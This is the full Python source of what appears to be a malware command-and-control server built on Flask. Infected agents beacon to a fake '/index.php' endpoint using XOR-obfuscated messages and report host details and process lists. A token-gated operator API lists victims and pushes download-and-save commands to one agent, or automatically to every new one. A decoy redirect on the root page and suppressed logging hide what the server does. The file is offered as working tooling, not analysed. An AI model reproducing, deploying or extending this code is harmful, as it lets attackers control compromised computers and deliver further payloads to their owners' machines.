import logging
import struct
import hashlib
import json
import datetime
from flask import Flask, request, redirect

#define status for agent
AGENT_NO_ACTION = 0
AGENT_NEED_DOWNLOAD = 1

#define key
POST_KEY = 0xEB
RECV_KEY = 0xBE

token_hash = "6806237cd9e5a5e5131eb6d7e3e2a05d"
#woSE0g35K32yoGlHmR2miqJjoOErE30GvWcVsfAOcSeK7Fn3hvfoXtPdsg2PucGK

autoDownloadLink = ""
autoSavedPath = ""
bAutoDownload = False

AgentMgr = None

class Agent:
	computerInfo = ""
	agentID = 0
	IP = ""
	lastConnect = None
	
	downloadLink = ""
	savedPath = ""
	processList = []
	status = AGENT_NO_ACTION
	def __init__(self, ID, computerInfo, IP):
		self.computerInfo = computerInfo.strip('\0')
		self.agentID = ID
		self.IP = IP
		self.downloadLink = ""
		self.savedPath = ""
		self.lastConnect = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
	
class AgentManager:
	agentList = []
	def isAgentExist(self, ID):
		for currentAgent in self.agentList:
			if currentAgent.agentID == ID:
				return True
		return False
		
	def addNewAgent(self, ID, computerInfo, IP):
		newAgent = Agent(ID, computerInfo, IP)
		self.agentList.append(newAgent)
	
	def updateAgentProcessListByID(self, ID, processList):
		for currentAgent in self.agentList:
			if currentAgent.agentID == ID:
				currentAgent.processList = processList.strip('\0').split("/")
				return
				
	def setAgentDownload(self, ID, Url, savedPath):
		for currentAgent in self.agentList:
			if currentAgent.agentID == ID:
				currentAgent.downloadLink = Url
				currentAgent.savedPath = savedPath
				currentAgent.status = AGENT_NEED_DOWNLOAD
				return
			
	def getAgentStatus(self, ID):
		for currentAgent in self.agentList:
			if currentAgent.agentID == ID:
				return currentAgent.status
				
	def setAgentStatus(self, ID, Status):
		for currentAgent in self.agentList:
			if currentAgent.agentID == ID:
				currentAgent.status = Status
				return
	
	def deleteAgent(self, ID):
		for currentAgent in self.agentList:
			if currentAgent.agentID == ID:
				self.agentList.remove(currentAgent)
				return True
		return False
				
	def getAgentDownloadInfo(self, ID):
		for currentAgent in self.agentList:
			if currentAgent.agentID == ID:
				ret = []
				ret.append(currentAgent.downloadLink)
				ret.append(currentAgent.savedPath)
				return ret
		return None
	
	def updateAgentDatetime(self, ID):
		for currentAgent in self.agentList:
			if currentAgent.agentID == ID:
				currentAgent.lastConnect = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
		return
		
def GenDownload(Url, savedPath):
	header = 0xCAFEBABE
	cmdID = 1
	fmtStruct = "=IBI%dsI%ds" % (len(Url), len(savedPath))
	return XorEnc(struct.pack(fmtStruct, header, cmdID, len(Url), str(Url), len(savedPath), str(savedPath)), RECV_KEY)

def GenDoNothing():
	return XorEnc('\xBE\xBA\xFE\xCA\x00', RECV_KEY)
	
app = Flask(__name__)
@app.route('/')
def main():
	return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ", 302)
	
@app.route("/index.php", methods=['POST'])
def index_php():
	global bAutoDownload
	global autoDownloadLink
	global autoSavedPath
	global AgentMgr
	
	rawData = XorEnc(request.get_data(), POST_KEY)
	if len(rawData) < 10:
		return ""
	fmtStruct = "=IBI%ds" % (len(rawData) - 9)
	Data = struct.unpack(fmtStruct, rawData)
	header = Data[0]
	command = Data[1]
	agentID = Data[2]
	dataFromAgent = Data[3]
	if command == 0:
		if AgentMgr.isAgentExist(agentID) == False:
			#We have new agent
			AgentMgr.addNewAgent(agentID, dataFromAgent, request.remote_addr)
			if bAutoDownload == True:
				return GenDownload(autoDownloadLink, autoSavedPath)
		else:
			AgentMgr.updateAgentDatetime(agentID)
			if AgentMgr.getAgentStatus(agentID) == AGENT_NEED_DOWNLOAD:
				downloadInfo = AgentMgr.getAgentDownloadInfo(agentID)
				AgentMgr.setAgentStatus(agentID, AGENT_NO_ACTION)
				if downloadInfo != None:
					return GenDownload(downloadInfo[0], downloadInfo[1])
	elif command == 1:
		if AgentMgr.isAgentExist(agentID) == True:
			AgentMgr.updateAgentProcessListByID(agentID, dataFromAgent)
				
	return GenDoNothing()

@app.route("/api", methods=['POST','GET'])
def api():
	global bAutoDownload
	global autoDownloadLink
	global autoSavedPath
	global AgentMgr
	
	if hashlib.md5(request.args['token']).hexdigest() != token_hash:
		return "Invalid Token"
	
	command = request.args['cmd']
	if command == "connect":
		return "Valid token"
	elif command == "listAgent":
		data = {}
		data['Auto Download'] = bAutoDownload
		data['Auto download Link'] = autoDownloadLink
		data['Auto download Path'] = autoSavedPath
		data['Agent']=[]
		for currentAgent in AgentMgr.agentList:
			agentData = {}
			agentData['ID'] = currentAgent.agentID
			agentData['IP Address'] = currentAgent.IP
			agentData['Computer Info'] = currentAgent.computerInfo
			agentData['Last Connected'] = currentAgent.lastConnect
			data['Agent'].append(agentData)
		return json.dumps(data)
	elif command == "info":
		ID = int(request.args['id'])
		data = {}
		for currentAgent in AgentMgr.agentList:
			if currentAgent.agentID == ID:
				agentData = {}
				agentData['ID'] = currentAgent.agentID
				agentData['IP Address'] = currentAgent.IP
				agentData['Computer Info'] = currentAgent.computerInfo
				agentData['Last Connected'] = currentAgent.lastConnect
				agentData['Process List'] = currentAgent.processList
				return json.dumps(agentData)
		return "Bad ID"	
	elif command == "setDownload":
		ID = int(request.args['id'])
		downloadLink = request.args['downloadLink']
		savedPath = request.args['savedPath']
		AgentMgr.setAgentDownload(ID, downloadLink, savedPath)
		return ""
	elif command == "autoDownloadOn":
		bAutoDownload = True
		autoDownloadLink = request.args['downloadLink']
		autoSavedPath = request.args['savedPath']
		return ""
	elif command == "autoDownloadOff":
		bAutoDownload = False
		autoDownloadLink = ""
		autoSavedPath = ""
	elif command == "delete":
		ID = int(request.args['id'])
		AgentMgr.deleteAgent(ID)
		return ""
	else:
		return "Bad Request"

def XorEnc(data, Key):
	ret = ""
	tmp = Key
	for c in data:
		tmp ^= ord(c)
		ret += chr(tmp)
		tmp = ord(c)
	return ret
		
if __name__ == '__main__':
	#init something
	AgentMgr = AgentManager()
	
	log = logging.getLogger('werkzeug')
	log.setLevel(logging.ERROR)
	app.run(host = "0.0.0.0", port = 80)